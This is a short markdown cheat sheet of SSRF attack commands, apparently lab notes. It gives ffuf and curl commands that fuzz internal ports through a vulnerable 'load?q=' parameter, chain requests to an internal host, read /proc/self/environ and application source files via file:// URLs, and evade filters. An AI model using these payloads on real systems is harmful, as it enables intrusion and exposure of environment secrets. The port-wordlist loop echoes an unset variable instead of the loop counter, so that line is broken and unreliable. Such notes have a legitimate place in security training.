# Fuzzing local ports

## How to generate port wordlist

```for i in {1..65535};do echo $port >> ports.txt;done```

## FFUF

```ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30```

# Interacting with the Target (localports)

```curl -i -s "http://<TARGET IP/load?q=http://127.0.0.1:PORT```

# Interacting with other web servers

```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"```

# Chaining multiple SSRFs together

```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"```


```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"```


```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -```

# Retrieving local file through the target application

```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"```

# Evading filters (Error based)

## Removing :// from request

```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"```

